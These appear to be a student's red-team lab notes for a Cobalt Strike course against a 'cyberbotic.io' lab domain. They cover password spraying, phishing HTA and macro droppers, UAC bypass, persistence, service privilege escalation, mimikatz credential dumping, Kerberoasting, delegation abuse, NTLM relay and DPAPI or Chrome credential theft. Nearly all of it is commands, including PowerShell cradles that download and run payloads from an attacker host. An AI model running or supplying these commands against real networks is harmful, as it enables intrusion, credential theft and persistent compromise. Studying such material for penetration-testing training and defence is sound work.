
# DNS records
```
dig cyberbotic.io+ short
```

```
whois 104.21.90.222
```

Spoofcheck is a Python tool that
can verify the email security of a given domain.
```
./spoofcheck.py cyberbotic.io
```

# Password spray
Password spraying is an effective technique for discovering weak passwords that users are
notorious for using. Patterns such as MonthYear (August2019), SeasonYear (Summer2019)
and DayDate (Tuesday6) are very common.

Two excellent tools for password spraying against Office 365 and Exchange
are MailSniper and SprayingToolkit. On the attacker-windows VM, open PowerShell and
import MailSniper.ps1.

In powershell:
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Enumerate the NetBIOS name of the target domain with Invoke-DomainHarvestOWA:
```
Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
```

Find names from https://cyberbotic.io website and put them in names.txt.

Use namemash.py to create permutations of usernames:
```
./namemash.py names.txt >> possible-usernames.txt
```

Then with Invoke-UsernameHarvestOWA check if usernames are valid:
```
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain DEV -UserList .\possible-usernames.txt -OutFile valid.txt
```

Spray passwords:
```
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
```

Download global address list:
```
Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
```

# Phishing
Login to OWA, https://10.10.15.100.

Create HTA:
```
<html>
    <head>
        <title>Hello World/title>
    </head>
    <body>
	    <h2>Hello World</h2>
        <p>This is an HTA...</p>
    </body>
	<script language="VBScript">
		Function Pwn()
			Set shell = CreateObject("wscript.Shell")
			If shell.ExpandEnvironmentStrings("%PROCESSOS_ARCHITECHTURE%") = "AMD64" Then
				shell.run "calc"
			Else
				shell.run "calc"
			End If
		End Function
	Pwn
	</script>
</html>
```

Replace calc with beacon payload (scripted web delivery).
```
shell.run "powershell.exe -nop -w hidden -c "...""
```

Create VBA for macros (in word, view -> macros -> create, select Document 1, then create):
```
Sub AutoOpen()

	Dim Shell As Object
	Set Shell = CreateObject("wscript.shell")
	Shell.Run "calc"

End Sub
```

Alternative with WMI Win32_Process:
```
Sub AutoOpen()

	Dim proc As Object
	Set proc = GetObject("winmgmts\\.\root\cimv2:Win32:Process")
	proc.Create "powershell"

End Sub
```

Replace calc with beacon payload (scripted web delivery).
```
shell.run "powershell.exe -nop -w hidden -c "...""
```

Save word file as .docm or .doc.

# Seatbelt
Build and use seatbelt to recon.

In beacon:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user
```

## UAC bypass
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
```

Look for priv esc checks and if UAC can be bypassed:
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

```
elevate uac-token-duplication tcp-4444-local
```

Or:
```
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/b"))"
connect localhost 4444
```

Not all UAC bypasses are equal, use seatbelt to list tokens:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
```

Token duplication will give lower privileges, so you have to elevate further:
```
elevate svc-exe tcp-4444-local
```

# Misc enum
In beacon:
```
screenshot
keylogger
```

```
jobs
jobkill <JID>
```

# Persistence
## Task scheduler
Creating payload in windows:
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Creating payload in linux:
```
str='IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

In beacon:
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <output from above>" -n "Updater" -m add -o hourly
```

## Startup folder
In beacon:
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <output from above>" -f "UserEnvEsetup" -m add
```

## Registry autorun
In beacon:
```
cd C:\ProgramData
upload C:\Payloads\beacon-http.exe
mv beacon-http.exe updater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

## DCOM hijack
Look under HKEY_CLASSES_ROOT\CLSID and HKEY_CLASSES_ROOT\Interface for id:s that look like {...}.

In powershell, if its in HKLM but not in HKCU then we can hijack it:
```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{...}\..."
Get-Item -Path "HKCU:\Software\Classes\CLSID\{...}\..."
```

Exploit:
```
New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{...}"
New-Item -Path "HKCU:\Software\Classes\CLSID\{...}" -Name "..." -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{...}\..." -Name "ThreadingModel" -Value Both
```

Generate payload in cobalt strike (windows executable (s), select windows dll).

```
cd C:\
upload C:\Payloads\beacon.dll
```

Find compatible tasks with powershell:
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
	if ($Task.Actions.ClassId -ne $null)
	{
		if ($Task.Triggers.Enabled -eq $true)
		{
			if ($Task.Principal.GroupId -eq "Users")
			{
				Write-Host "Task-Name: " $Task.TaskName
				Write-Host "Task-Path: " $Task.TaskPath
				Write-Host "CLSID: " $Task.Actions.ClassId
				Write-Host
			}
		}
	}
}
```

# Privilege escalation
## Windows services
```
sc query
Get-Service | fl
```
## Unquoted service paths
```
run wmic service get name, pathname
```

```
powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

Exploit:
```
cd C:\Program Files\Vuln Services
ls
upload C:\Payloads\beacon-tcp-svc.exe
mv beacon-tcp-svc.exe Service.exe
```

```
run sc stop Vuln-Service-1
run sc start Vuln-Service-1
```

```
connect localhost 4444
```

## Weak service permissions
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty Access
```

Exploit:
```
mkdir C:\Temp
cd C:\Temp
upload C:\Payloads\beacon-tcp-svc.exe
mv C:\Payloads\beacon-tcp-svc.exe fake-service.exe
run sc qc Vuln-Service-2
run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
run sc qc Vuln-Service-2
run sc query Vuln-Service-2
run sc stop Vuln-Service-2
run sc start Vuln-Service-2
connect localhost 4444
```

## Weak service binary permissions
```
powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
```

```
download Service 3.exe
upload C:\Payloads\Service 3.exe
<error, file is used by another process>
```

Generate payload Service 3.exe in cobalt strike.

```
run qc stop Vuln-Service-3
upload C:\Payloads\Service 3.exe
run qc start Vuln-Service-3
connect localhost 4444
```

## Always install elevated
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

Look for AlwaysInstallElevated registry keys and HKLM: 1 and HKCU: 1

Create project in Visual Studio, search for installer, select Setup Wizard.

Set name and location to C:\Payloads, select place solution and project in same directory.

Choose files to add, click add and select generated payload from cobalt strike.

Right click project in Visual Studio, view -> custom actions
Right click install and select add custom action
Double click application folder, select beacon payload, click OK
Change Run64Bit to True in custom action properties

Build project

```
cd C:\Temp
upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
run msiexec /i BeaconInstaller /q /n
connect localhost 4444
```

# Domain recon
```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```
## Get-Domain
You can use -Domain to specify the domain.
```
powershell Get-Domain
powershell Get-Domain -Domain cyberbotic.io
```
## Get-DomainController
Get domain controllers:
```
powershell Get-DomainController | select Forest, Name, OSVersion | fl
```
## Get-ForestDomain
You can use -Forest to specify the forest.
```
powershell Get-ForestDomain
powershell Get-ForestDomain -Forest cyberbotic.io
```
## Get-DomainPolicyData
Find policies such as password policy:
```
powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
```
## Get-DomainUser
All users:
```
powershell Get-DomainUser | fl
```

Specific user:
```
powershell Get-DomainUser -Identity nlamb | fl
```

Get domain user by property and user:
```
powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
```

Get all domain users by property:
```
powershell Get-DomainUser -Properties DisplayName, MemberOf | fl
```
## Get-DomainComputer
All computers:
```
powershell Get-DomainComputer
```

Get domain computer by property:
```
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```
## Get-DomainOU
All OUs:
```
powershell Get-DomainOU
```

Get domain OU by property:
```
powershell Get-DomainOU -Properties Name | sort -Property Name
```
## Get-DomainGroup
All groups:
```
powershell Get-DomainGroup
```

Get domain groups by property:
```
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
## Get-DomainGroupMember
Get members of a specific domain group:
```
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```
## Get-DomainGPO
Get all GPOs:
```
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
```

Get all GPOs for a computer:
```
powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
```
## Get-DomainGPOLocalGroup
```
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```
## Get-DomainGPOUserLocalGroupMapping
Check if a specific domain user or group is a member of a specific local group:
```
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
## Find-DomainUserLocation
Enumerate all machines and query the domain for users of a specified group. Finds the domain machines where those users are logged in:
```
powershell Find-DomainUserLocation | select UserName, SessionFromName
```
## Get-NetSession
CName is source IP.
```
powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
```
## Get-DomainTrust
Get all domain trusts for the current domain:
```
powershell Get-DomainTrust
```

Get all domain trusts for the specific domain:
```
powershell Get-DomainTrust -Domain cyberbotic.io
```
## SharpView
You can use same commands in SharpView as for PowerView, its the .NET port of PowerView.
```
execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
```
## ADSearch
Example, search for all groups ending with Admins: 
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
```
## BloodHound
Start neo4j:
```
cd C:\Tools\neo4j\bin
neo4j.bat console
```

Collect DcOnly and domain with SharpHound:
```
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound3.exe -c DcOnly -d cyberbotic.io
```

Collect all:
```
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound3.exe -c All
```

Then download BloodHound.zip and upload to BloodHound GUI.

### Cypher queries
Find all users with SPN set:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Find all computers will AllowedToDelegate to other computers:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

Find shortest path from kerberoastable users (SPN set) to domain admin:
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```
# Lateral movement
We can use jump, remote-exec or even seatbelt.
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
```

Always test local admin access on target before moving:
```
ls \\srv-1\c$
```
## Powershell remoting
Check arch of target:
```
remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

Then jump (returns high integrity beacon):
```
jump winrm64 srv-1 smb
```
## PsExec
PsExec uploads a service binary to the target and then create a windows service to start and execute the binary.

Performs process migration automatically.

Returns SYSTEM beacon:
```
jump psexec64 srv-1 smb
```
## WMI
Part of remote-exec and we have to first upload a payload:
```
cd \\srv-1\ADMIN$
upload C:\Payloads\beacon-smb.exe
remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
```

Then link it:
```
link srv-1
```
## CoInitializeSecurity
If remote-exec does not work, and returns "CoInitializeSecurity already called", our WMI execution must come from a different process.

We can use spawn, spawnas or even execute-assembly with SharpWMI:
```
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"
```
## DCOM
```
powershell-import C:\Tools\Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
```

Then link it:
```
link srv-1
```
# Credentials and impersonation
Check for currently logged in users:
```
net logons
```

## LogonPasswords
Dump plaintext passwords from memory.

Using mimikatz:
```
mimikatz sekurlsa::logonpasswords
```

Or short command:
```
logonpasswords
```

NTLM = RC4
eKeys = SHA256 or SHA128
## eKeys
Dump eKeys:
```
mimikatz sekurlsa::ekeys
```

Look for aes256_hmac or aes128_hmac.
## SAM
Dump SAM:
```
mimikatz lsadump::sam
```

Contains NTLM hashes of local accounts only.
## Domain cached credentials
Dump cache:
```
mimikats lsadump::cache
```

These credentials are rarely used but should be cracked offline.
## Make token
Impersonate a user:
```
make_token DEV\jking Purpl3Drag0n
```

Revert to self, dispose of token:
```
rev2self
```
## Process injection
List processes:
```
ps
```

Inject into process with PID 3320:
```
inject 3320 x64 tcp-4444-local
```
## Token impersonation
Impersonate access token from target process, requires local admin:
```
steal_token 3320
```
## SpawnAs
Spawn a new process using plaintext credentials, does not require local admin:
```
spawnas DEV\jking Purpl3Drag0n tcp-4444-local
```

Common mistake is to run the command where you dont have read access. Run it in C:\.
## Pass the hash
Authenticate to a windows service using NTLM hash of a user:
```
pth DEV\jking <NTLM>
```

To avoid \\.pipe\ indicator in pth, use mimikatz and specify process:
```
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:<NTLM>
```

If we dont add /run, cmd.exe is used. Use for example powershell:
```
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /run:powershell -w hidden /ntlm:<NTLM>
```

Then steal the token from the spawned process:
```
steal_token <PID>
```
## Overpass the hash
Authenticate with kerberos instead of NTLM, 4 steps.
- Request a TGT for the user that you want to impersonate
- Create a sacrificial logon session
- Pass the TGT to that logon session
- Access the target resource

With NTLM:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:<NTLM> /nowrap
```

Or use eKeys:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:<eKeys> /nowrap /opsec
```

To verify:
```
run klist
```

Next step, create a sacrificial logon session:
```
make_token DEV\jking FakePass
```

Now klist should list 0 tokens.

Pass the TGT to that logon session, in powershell:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```

Or in bash:
```
echo -en "...ticket..." | base64 -d > jkingTGT.kirbi
```

Use the TGT:
```
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
```

Now you can access the target resource.

If you are in an elevated context (SYSTEM), use rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:<eKeys> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
```

Then steal the token:
```
steal_token <PID>
```
## Extract kerberos tickets
List all kerberos tickets in all the logon sessions currently on the system, if elevated it shows all, else only in your logon session:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

Extract kerberos tickets from memory:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
```

Create sacrificial process, using **createnetonly**, note the **LUID** and **ProcessID**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```

Pass the TGT to the sacrificial logon session, using **ptt**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:<LUID> /ticket:<...base64-ticket...>
```

Steal the access token of that process:
```
steal_token <PID>
```

Now you can access the target resource.

# Password cracking
Basic hashcat cracking:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt
```
**-a 0** is wordlist mode
**-m 1000** is NTLM hash
**ntlm.txt** is the NTLM hash to crack
**rockyou.txt** is the wordlist

## Wordlist + rules
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -r rules/add-year.rule
```
-r rules/add-year.rule is our custom rule file

Add **$2$0$2$0** to the add-year.rule file. It will append 2020 to the words in rockyou.txt.
## Masks
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
```
**-a 3** is mask attack
**?u?l?l?l?l?l?l?l?d** is the mask

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -l ?d?s ?u?l?l?l?l?l?l?l?l
```
**-l** is custom charset
**?u?l?l?l?l?l?l?l?l** is the mask where **-l** is the custom charset
## Mask length & mask files
D:\\Tools\\example.hcmask:
```
?d?s,?u?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l?l?l
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt D:\Tools\example.hcmask
```

D:\\Tools\\example2.hcmask:
```
ZeroPointSecurity?d
ZeroPointSecurity?d?d
ZeroPointSecurity?d?d?d
ZeroPointSecurity?d?d?d?d
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt D:\Tools\example2.hcmask
```
## Combinator
D:\\Tools\\list1.txt:
```
purple
```

D:\\Tools\\list2.txt:
```
monkey
dishwasher
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt D:\Tools\list2.txt -j $- -k $!
```

Will become purple-monkey!
## Hybrid
With wordlist and mask:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt ?d?d?d?d
```
**-a 6** is hybrid wordlist and mask mode
**?d?d?d?d** is the mask

With mask and wordlist:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d D:\Tools\list1.txt
```
**-a 7** is hybrid mask and wordlist mode
**?d?d?d?d** is the mask
## Kwprocessor
Generate keywalk passwords:
```
D:\Tools\kwprocessor\kw64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
# Session passing
Spawn payloads that can talk to other cobalt strike listeners, or listeners of other C2 frameworks.

Metasploit:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT 8080
exploit -j
```

Create listener, add -> foreign http. Name it metasploit.

Spawn it in beacon:
```
spawn metasploit
```

Check metasploit for a session.

Alternative is to use **shinject** in beacon to inject arbitrary shellcode in to specified process:
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
```

```
execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 C:\Payloads\msf.bin
```

Same can be done in reverse, generate beacon payload, windows executable (s), select raw as output, x64. Save to beacon.bin.

Metasploit, a session has to exist already:
```
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
```
# Socks proxy
Start socks proxy:
```
socks 1080
```

Edit **/etc/proxychains.conf** to reflect.

Use proxychains with a tool like nmap.
# Windows apps
Tunnel GUI apps with Proxifier.
1. Profile -> proxy servers -> add.
2. Profile -> proxification rules, add your app and target hosts

RSAT with clear text credentials:
```
runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

RSAT with NTLM:
```
mimikatz
privilege::debug
sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm:<NTLM> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

Remember to add entry to hosts file (C:\\windows\\system32\\drivers\\etc\\hosts).

# Browsers
Use FoxyProxy in firefox.
# Metasploit
```
setg Proxies socks4:10.10.5.120:1080
```
# Reverse port forward
## In powershell
```
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
	$client = $listener.AcceptTcpClient()
	Write-Host "A client has connected"
	$client.Close()
}
```

```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

```
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## In beacon
Bind port 8080 on foothold machine and redirect to 10.10.5.120 port 80:
```
rportfwd 8080 10.10.5.120 80
```

```
rportfwd stop 8080
```

Forward to local machine:
```
rportfwd_local 8080 127.0.0.1 8080
```
# NTLM relaying
```
upload C:\Tools\PortBender\WinDivert64.sys
```

Load **PortBender.cna** from **C:\Tools\PortBender** to cobalt strike.

Requires local admin to execute.

Redirect traffic from port **445** to 8445**:**
```
PortBender redirect 445 8445
```

Relay traffic from port **8445** to port 445 **to** team server:
```
rportfwd 8445 127.0.0.1 445
```

We need socks proxy for **ntlmrelayx** responses:
```
socks 1080
```

Now we can use **proxychains** and **ntlmrelayx**:
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
```

Use NTLM for administrator from above dump:
```
pth .\Administrator <NTLM>
```

Alternatively run powershell command:
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```

Forcing NTLM authentication with images in emails:
```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

NTLM authentication with shortcuts:
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```
Where software is a share.

Now view the share to trigger the shortcut.
# DPAPI
## Credential manager
Credential manager blobs are stored in users AppData directory:
```
ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
```

List creds with native **vaultcmd** in windows:
```
run vaultcmd /listcreds:"Windows Credentials" /all
```

Or with mimikatz:
```
mimikatz vault::list
```

To decrypt the credential, we first need to find the master encryption key:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<...cred...>
```

Look for **pbData** and **guidMasterKey**.

The master key is located under the users **AppData\\Roaming\\Microsoft\\Protect\\SID** directory.
```
ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>
```
There should be a file that matches the **guidMasterKey**.

Use mimikatz with the master key:
```
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey> /rpc
```

Use mimikatz with the **key** from the output above to decrypt the credential:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<...cred...> /masterkey:<key>
```
## Google chrome
Chrome stores DPAPI credentials in a local SQLite database in the users AppData directory:
```
ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default
```

Look for **Login Data** directory and it should not be empty.

Decrypt with **SharpChromium**:
```
execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins
```
# Kerberos
## Kerberoasting
Roast every account in the domain that has SPN set:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

Bad OPSEC but we can search for all users with SPN not blank instead:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

With BloodHound:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Paths to computers from kerberoastable accounts:
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

Kerberoast specific account with rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

Crack with john with **--format=krb5tgs --wordlist=rockyou.txt svc_mssql**

Crack with hashcat with **-a 0 -m 13100 svc_mssql rockyou.txt**
## AS-REP roasting
User that dont have kerberos pre-authentication enabled can be AS-REP roasted. Requesting a AS-REP for that user and crack it offline.

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

In BloodHound:
```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
```

Crack with john with **--format=krb5asrep --wordlist=rockyou.txt svc_mssql**

Crack with hashcat with **-a 0 -m 18200 svc_mssql rockyou.txt**
## Unconstrained delegation
Delegation allows a user or service to act on behalf of another user to another service. If we compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use it to impersonate the user against other services in the domain.

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

In BloodHound:
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

Domain controllers always have unconstrained delegation configured by default, ignore them.

Monitor with rubeus for TGTs on the server and extract them, requires local admin:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10 /nowrap
```

If nlamb accesses the server, monitor will extract the TGT.

Stop monitor with **jobs** and **jobkill** in beacon.

Take the base64 encoded ticket from monitor and decode it to a **.kirbi** file, create sacrificial logon process and pass TGT into it:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\nlamb.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```
```
make_token DEV\nlamb FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
```
## The printer bug
On SRV-1:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
```

On WKSTN-1:
```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
```
Where dc-2 is the target server and srv-1 is the capture server.

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc-2.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```
```
make_token DEV\DC-2$ FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi
```
## Constrained delegation
Find all computers configured for constrained delegation and what they are allowed to delegate to:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

In BloodHound:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

page 105